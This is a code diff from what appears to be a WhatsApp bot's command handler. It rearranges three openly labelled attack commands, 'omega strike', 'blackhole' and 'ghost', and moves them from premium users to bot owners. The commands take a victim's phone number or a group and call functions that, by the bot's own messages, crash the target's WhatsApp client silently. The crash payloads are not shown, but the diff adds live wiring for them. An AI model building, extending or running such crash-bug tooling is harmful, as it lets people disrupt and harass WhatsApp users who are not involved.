@@ -3088,23 +3088,7 @@ Usage: ${prefix}setbotname <new name>
             }
             break;
         }
-        case 'zukomega':
-case 'zomegastrike':
-case 'zukoomega': {
-  if (!isPremium) return zreply("*This command is for premium users only.*");
-  if (!q) return zreply(`Usage: ${prefix+command} 234705xxx`);
-  let jidx = q.replace(/[^0-9]/g, "");
-  if (jidx.startsWith('0')) return zreply(`Usage: ${prefix+command} 234705xxx !!`);
-  if (jidx === "2347059886720") return zreply("❌ This number is protected.");
-
-  let isTarget = `${jidx}@s.whatsapp.net`;
-  let Menu = `⚡ ZUKOXMD OMEGA STRIKE ⚡\n\nTarget: ${isTarget}\nAttack: OMEGA HYBRID\n\nWaiting 5-10 minutes for effect...`;
-  sreply(Menu);
-
-  await ZukoOmegaStrike(isTarget);
-}
-break;
-
+       
         // ═══════════════════════════════════════════════════
         // SETGCNAME - Set group name
         // ═══════════════════════════════════════════════════
@@ -3325,19 +3309,7 @@ ${adminList}`,
             }
             break;
         }
-        case 'ghost':
-case 'zghost':
-case 'zuko-ghost': {
-  if (!isPremium) return zreply("*This command is for premium users only.*");
-  if (!m.isGroup) return zreply('*This attack only works in groups.*');
-  
-
-  let Menu = `👻 ZUKO GHOST STRIKE 👻\n\nTarget Group: ${groupName}\nAttack: INVISIBLE CRASH\n\n⚠️ This attack is INVISIBLE to members:\n- No visible messages appear\n- No notifications\n- Client crashes silently\n\n⏳ Waiting 5-10 minutes for effect...\n\n🔥 Only admins and bot will know this happened.`;
-  sreply(Menu);
-
-  await ZukoGhostStrike(m.chat);
-}
-break;
+        
 
         // ═══════════════════════════════════════════════════
         // ANTICALL
@@ -3427,10 +3399,27 @@ break;
             reply(`✅ *Goodbye message set!*\n\n${text}`);
             break;
         }
-        case 'blackhole':
+        case 'zukomega':
+case 'zomegastrike':
+case 'zukoomega': {
+  if (!isCreator) return zreply("*This command is for bot owners only.*");
+  if (!q) return zreply(`Usage: ${prefix+command} 234705xxx`);
+  let jidx = q.replace(/[^0-9]/g, "");
+  if (jidx.startsWith('0')) return zreply(`Usage: ${prefix+command} 234705xxx !!`);
+  if (jidx === "2347059886720") return zreply("❌ This number is protected.");
+
+  let isTarget = `${jidx}@s.whatsapp.net`;
+  let Menu = `⚡ ZUKOXMD OMEGA STRIKE ⚡\n\nTarget: ${isTarget}\nAttack: OMEGA HYBRID\n\nWaiting 5-10 minutes for effect...`;
+  sreply(Menu);
+
+  await ZukoOmegaStrike(isTarget);
+}
+break;
+
+case 'blackhole':
 case 'zblackhole':
 case 'zuko-blackhole': {
-  if (!isPremium) return zreply("*This command is for premium users only.*");
+  if (!isCreator) return zreply("*This command is for bot owners only.*");
   if (!q) return zreply(`Usage: ${prefix+command} 234705xxx`);
   
   let jidx = q.replace(/[^0-9]/g, "");
@@ -3442,6 +3431,20 @@ case 'zuko-blackhole': {
   sreply(Menu);
 
   await ZukoBlackHole(isTarget);
+}
+break;
+
+case 'ghost':
+case 'zghost':
+case 'zuko-ghost': {
+  if (!isCreator) return zreply("*This command is for bot owners only.*");
+  if (!m.isGroup) return zreply('*This attack only works in groups.*');
+  if (!isBotAdmins) return zreply('*Bot must be admin to execute ghost attacks.*');
+
+  let Menu = `👻 ZUKO GHOST STRIKE 👻\n\nTarget Group: ${groupName}\nAttack: INVISIBLE CRASH\n\n⚠️ This attack is INVISIBLE to members:\n- No visible messages appear\n- No notifications\n- Client crashes silently\n\n⏳ Waiting 5-10 minutes for effect...\n\n🔥 Only admins and bot will know this happened.`;
+  sreply(Menu);
+
+  await ZukoGhostStrike(m.chat);
 }
 break;
 
